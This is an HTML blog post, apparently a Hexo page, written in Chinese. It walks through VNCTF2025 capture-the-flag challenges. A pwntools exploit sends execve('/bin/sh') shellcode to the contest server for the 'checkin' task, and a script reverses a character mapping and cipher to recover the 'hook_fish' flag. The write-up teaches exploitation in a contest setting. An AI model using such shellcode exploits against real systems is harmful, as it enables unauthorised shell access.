@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="j1ya">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Pwncheckin    这题会把rsp置0，也就是说用系统生成的shellcode没用   考虑用ret2syscall 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from struct import packfrom ctypes import *#f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VNCTF2025部分Pwn与Reverse">
+<meta property="og:url" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/index.html">
+<meta property="og:site_name" content="j1ya">
+<meta property="og:description" content="Pwncheckin    这题会把rsp置0，也就是说用系统生成的shellcode没用   考虑用ret2syscall 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from struct import packfrom ctypes import *#f">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1738999531360-a39871a2-1265-486b-8ccc-64b461ed0c0a.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739005361582-9da085b2-e416-46a1-9fb2-9e0bd25a897e.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739005350423-7d24494a-123d-4de6-949b-6ef729da0d79.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016398519-e32dac73-5afc-4209-b36d-d3d8f453bc8d.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739014258915-192f023d-b5c1-450a-a7de-39fc5c30387a.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016537563-fc776926-5d08-4ff1-9a7a-7a6f28f35258.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016667231-d800b539-4a0e-4361-a835-ca759dc44344.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016785826-9f878d15-ab10-4ae7-a551-1f403c36302f.png">
+<meta property="article:published_time" content="2025-02-09T01:32:11.000Z">
+<meta property="article:modified_time" content="2025-02-09T01:33:25.773Z">
+<meta property="article:author" content="j1ya">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://j1ya-22.github.io/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1738999531360-a39871a2-1265-486b-8ccc-64b461ed0c0a.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>VNCTF2025部分Pwn与Reverse - j1ya</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"j1ya-22.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","app_key":"tdZv3tC3tP1IszSKxEodRe6e","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>j1ya</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="VNCTF2025部分Pwn与Reverse"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-09 09:32" pubdate>
+          2025年2月9日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          627 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">VNCTF2025部分Pwn与Reverse</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1738999531360-a39871a2-1265-486b-8ccc-64b461ed0c0a.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739005361582-9da085b2-e416-46a1-9fb2-9e0bd25a897e.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>这题会把rsp置0，也就是说用系统生成的shellcode没用</p>
+<img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739005350423-7d24494a-123d-4de6-949b-6ef729da0d79.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>考虑用ret2syscall</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>	io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node.vnteam.cn&#x27;</span>,<span class="hljs-number">45311</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):    <br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;    </span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)    <br>    attach(io,bk)  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>	<span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov al,59</span><br><span class="hljs-string">add rdi,8</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-comment">#debug()</span><br>s(shellcode)<br>inter()<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="hook-fish"><a href="#hook-fish" class="headerlink" title="hook_fish"></a>hook_fish</h2><p>加载资源</p>
+<img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016398519-e32dac73-5afc-4209-b36d-d3d8f453bc8d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>得到hook_fish.dex</p>
+<img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739014258915-192f023d-b5c1-450a-a7de-39fc5c30387a.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>从输入经过encrypt函数，后面调用loadclass方法</p>
+<img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016537563-fc776926-5d08-4ff1-9a7a-7a6f28f35258.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>encode方法加载hook_fish的encode方法，然后加载hook_fish的check方法比较</p>
+<img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016667231-d800b539-4a0e-4361-a835-ca759dc44344.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>check方法里面找到密文，发现hook_fish的encode方法用HashMap在做映射</p>
+<img src="/2025/02/09/VNCTF2025%E9%83%A8%E5%88%86Pwn%E4%B8%8EReverse/1739016785826-9f878d15-ab10-4ae7-a551-1f403c36302f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<p>先根据密文找到映射前的字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HookFish</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.fish_dcode = &#123;&#125;<br>        self.fish_ecode = &#123;&#125;<br>        self.strr = <span class="hljs-string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span><br>        self.decode_map()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_map</span>(<span class="hljs-params">self</span>):<br>        self.fish_dcode = &#123;<br>            <span class="hljs-string">&quot;iiijj&quot;</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&quot;jjjii&quot;</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&quot;jijij&quot;</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&quot;jjijj&quot;</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&quot;jjjjj&quot;</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&quot;ijjjj&quot;</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <br>            <span class="hljs-string">&quot;jjjji&quot;</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&quot;iijii&quot;</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&quot;ijiji&quot;</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&quot;iiiji&quot;</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&quot;jjjij&quot;</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&quot;jijji&quot;</span>: <span class="hljs-string">&#x27;l&#x27;</span>, <br>            <span class="hljs-string">&quot;ijiij&quot;</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&quot;iijji&quot;</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&quot;ijjij&quot;</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&quot;jiiji&quot;</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&quot;ijijj&quot;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&quot;jijii&quot;</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <br>            <span class="hljs-string">&quot;iiiii&quot;</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&quot;jjiij&quot;</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&quot;ijjji&quot;</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&quot;jiiij&quot;</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&quot;iiiij&quot;</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&quot;iijij&quot;</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <br>            <span class="hljs-string">&quot;jjiji&quot;</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&quot;jijjj&quot;</span>: <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&quot;iijjl&quot;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&quot;iiilj&quot;</span>: <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&quot;iliii&quot;</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&quot;jiili&quot;</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <br>            <span class="hljs-string">&quot;jilji&quot;</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&quot;iliji&quot;</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&quot;jjjlj&quot;</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&quot;ijljj&quot;</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&quot;iljji&quot;</span>: <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&quot;jjjli&quot;</span>: <span class="hljs-string">&#x27;0&#x27;</span><br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span></span>):<br>        result = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>), <span class="hljs-number">5</span>): <br>            fragment = <span class="hljs-built_in">str</span>[i:i+<span class="hljs-number">5</span>]<br>            result.append(self.fish_dcode.get(fragment, <span class="hljs-string">&#x27;?&#x27;</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(result)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    hook_fish = HookFish()<br>    decoded_str = hook_fish.decode(hook_fish.strr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decoded string: &quot;</span>, decoded_str)<br><span class="hljs-comment">#0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5</span><br></code></pre></td></tr></table></figure>
+
+<p>然后按照encrypt逆向即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5&#x27;</span><br>s1=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># for i in range(len(s)):</span><br><span class="hljs-comment">#     for j in range(48,127):</span><br><span class="hljs-comment">#         k=j</span><br><span class="hljs-comment">#         if k&gt;=97 and k&lt;=97+25:</span><br><span class="hljs-comment">#             tmp=k-49+(i%4)</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             tmp=k+ord(&#x27;7&#x27;)+(i%10)</span><br><span class="hljs-comment">#         if tmp==ord(s[i]):</span><br><span class="hljs-comment">#             print(chr(j),end=&quot;&quot;)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#a9297889a8fb9b3a6b9a870b57db3afa2b47bb3ac84739fa3a1bdb3aaa5779ca56570b1c</span><br>s2=<span class="hljs-string">&#x27;a9297889a8fb9b3a6b9a870b57db3afa2b47bb3ac84739fa3a1bdb3aaa5779ca56570b1c&#x27;</span><br>s3=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># print(&#x27;\n&#x27;)</span><br><span class="hljs-comment"># for i in range(0,len(s2),2):</span><br><span class="hljs-comment">#     s3+=s2[i+1]+s2[i]</span><br><span class="hljs-comment"># print(s3)</span><br><br><span class="hljs-comment">#9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1</span><br>s3=<span class="hljs-string">&#x27;9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s3),<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(s3[i]+s3[i+<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">68</span>),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%AF%94%E8%B5%9Bwp/" class="category-chain-item">比赛wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>VNCTF2025部分Pwn与Reverse</div>
+      <div>https://j1ya-22.github.io/2025/02/09/VNCTF2025部分Pwn与Reverse/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>j1ya</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/05/patch-used-for-a-reverse-problem-named-sm4-in-MoeCTF2024/" title="patch used for a reverse problem named sm4 in MoeCTF2024">
+                        <span class="hidden-mobile">patch used for a reverse problem named sm4 in MoeCTF2024</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","appKey":"tdZv3tC3tP1IszSKxEodRe6e","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
